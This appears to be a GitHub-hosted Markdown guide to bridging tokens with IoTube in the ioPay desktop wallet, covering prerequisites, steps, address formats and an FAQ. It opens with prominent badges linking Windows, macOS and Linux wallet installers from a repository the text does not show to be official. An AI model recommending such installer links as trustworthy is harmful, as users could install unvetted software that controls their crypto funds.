![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# How to Use the IoTube Bridge in ioPay Wallet

IoTube is the bridge between IoTeX and other chains. In ioPay Wallet it is built in: you choose a source and destination chain, pick the token and the amount, read the fee and the estimate, confirm, and then watch the transfer until it credits on the other side.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

The steps are short. The prerequisites are where transfers actually fail, so start there.

## Prerequisites

**The current build.** The release this page describes is **v2.0.2, 19 November 2026**. An older build may point at endpoints or mechanisms that have changed since.

**The token on the source chain.** You can only bridge an asset you actually hold on the chain you are bridging from. Native IOTX lives on IoTeX; an ERC-20 form of IOTX on Ethereum is a different asset with a different route.

**Gas on both chains.** This is the one people skip. A bridge transfer is two transactions - one on the source chain, one on the destination chain to deliver the asset - and the destination needs gas to complete. Fund the destination account with a little of that chain's native token *before* you bridge, not after.

**The right destination address.** IoTeX accounts exist as an `io1...` native address and a `0x...` EVM address, and both belong to the same account. Use the form the destination chain expects - and never paste an address from a different chain into the destination field.

## The steps

1. **Open the bridge.** In ioPay Wallet, go to the bridge section of the app.
2. **Choose the source chain and the destination chain.** The pair determines the route, the fee and the token list.
3. **Choose the token.** The list is per-route: a token available from Ethereum to IoTeX is not automatically available in the other direction or from another chain.
4. **Enter the amount.** Read the minimum. If the amount is under it, the app will not build the transfer - that is not an error, it is the minimum doing its job.
5. **Read the fee and the estimate before confirming.** The fee is what the bridge charges for the route; the estimate is a time range, not a promise. Neither is fixed across routes or across congestion.
6. **Confirm and sign.** At this point the source-chain transaction is real. If you are using a hardware wallet, this is where the device confirms.
7. **Watch the status tracker.** The wallet shows a status for the transfer. Stay on it until the destination side credits - that is the completion event, not the source-chain confirmation.

## Supported chains, precisely

The approved feature set for this build names **Ethereum, BSC and Polygon** for bridging, and those are the only chains this page will claim. If you want to bridge from a chain not in that list, the bridge is not the route - and this article will not invent one.

This page also does not quote a fixed transfer time. Bridge delivery depends on the source chain's finality, the destination chain's congestion and the gas you funded. Anyone quoting "always N minutes" is quoting a best case.

## The address step, properly

Most "my bridge transfer vanished" reports are an address problem, and it is worth thirty seconds:

- **`io1...` and `0x...` are the same account.** The wallet shows both, with copy buttons and a QR code, exactly so you do not have to guess. Sending to either form is sending to you.
- **The destination field wants the destination chain's format.** If you are bridging *to* IoTeX, the destination is your IoTeX address. If you are bridging *from* IoTeX to Ethereum, the destination is an Ethereum address - which may be the same account's `0x...` form, or a different wallet entirely.
- **A transfer to the wrong chain is not recoverable by re-sending.** The asset went where the address pointed. Sending again creates a second transfer with a second outcome.

## After the transfer

- **Confirm the credit on the destination chain**, not just the source confirmation.
- **Understand what arrived.** A bridged asset is a representation, not the native token. That matters for staking: only native IOTX stakes. CIOTX - the cross-chain representation retired through IIP-56 - is not a staking asset, and neither is legacy ERC-20 IOTX.
- **If the transfer does not credit**, go to [fixing IoTube swap errors](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/fixing-iotube-swap-errors-in-iopay.md) rather than repeating the transfer. The diagnostic order there starts with the two things that explain most cases: destination gas and the destination address format.
- **If the transfer is from the February-March 2026 window**, read [the incident page](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/what-iopay-users-should-know-about-the-iotube-incident.md) before anything else - that event has a claims route and a different answer.

## Related

- [Moving BSC or Polygon tokens](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/moving-bsc-tokens-into-iopay-wallet.md) - the other two routes this bridge supports.

## FAQ

**Which chains can I bridge between?**
Ethereum, BSC and Polygon, per this build's approved feature set. Routes are directional and token lists are per-route.

**Do I need gas on both chains?**
Yes. The source transaction pays its own fee; the destination transaction needs gas to deliver the asset.

**How long does it take?**
There is no fixed time. It varies with source finality, destination congestion and the gas you funded, which is why the app shows an estimate and a tracker rather than a promise.

**Can I cancel a bridge transfer once it is confirmed?**
No. Once the source transaction is mined, it is final. Cancelling a quote before signing is different - an unsigned quote moves nothing.

---

*Bridge behaviour and the supported-chain list come from the v2.0.2 feature set. Address formats and the native/EVM distinction follow IoTeX chain documentation.*
